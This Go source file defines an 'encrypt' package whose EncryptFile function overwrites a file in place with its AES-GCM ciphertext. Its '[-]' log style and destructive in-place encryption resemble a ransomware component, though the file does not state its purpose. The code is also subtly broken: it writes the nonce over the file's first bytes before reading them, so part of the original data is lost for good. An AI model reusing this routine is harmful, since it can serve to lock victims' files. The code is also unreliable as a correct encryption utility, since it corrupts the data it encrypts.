package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"log"
	"os"
)

func EncryptFile(key []byte, inputFile string) error{
	inFile, err := os.OpenFile(inputFile, os.O_RDWR, 0600)

	if err != nil{
		log.Println("[-] Fail to open file " + inputFile)
		return err 
	}

	defer inFile.Close()

	cipher, err := createCipher(key)

	if err != nil{
		log.Println("[-] Fail to create cipher")
		return err
	}


	gcm, err := createGCM(cipher)

	if err != nil{
		log.Println("[-] Fail to create gcm")
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		log.Println("[-] Fail to create nonce")
		return err
	}

	if _, err = inFile.WriteAt(nonce, 0); err != nil {
		return err
	}

	plainData, err := readFile(inFile)
	
	if err != nil{
		log.Println("[-] Fail to read file")
		return err 
	}

	cipherData := gcm.Seal(nil, nonce, plainData, nil)

	err = overWriteFile(inFile, cipherData, gcm)

	if err != nil{
		log.Println("[-] Fail to encrypt data")
		return err
	}

	return nil
}

func createCipher(key []byte) (cipher.Block, error){
	block, err := aes.NewCipher(key)

	if err != nil{
		return nil, err
	}

	return block, nil
}

func createGCM(c cipher.Block)(cipher.AEAD, error){
	aesGCM, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	return aesGCM, err
}

func readFile(file *os.File) ([]byte, error){
	plainData, err := io.ReadAll(file)
	if err != nil {
		return nil, err
	}
	return plainData, nil
}

func overWriteFile(inFile *os.File, dataEncrypted []byte, gcm cipher.AEAD)error{
	_, err := inFile.WriteAt(dataEncrypted, int64(gcm.NonceSize()))

	if err != nil{
		return err
	}

	return err
}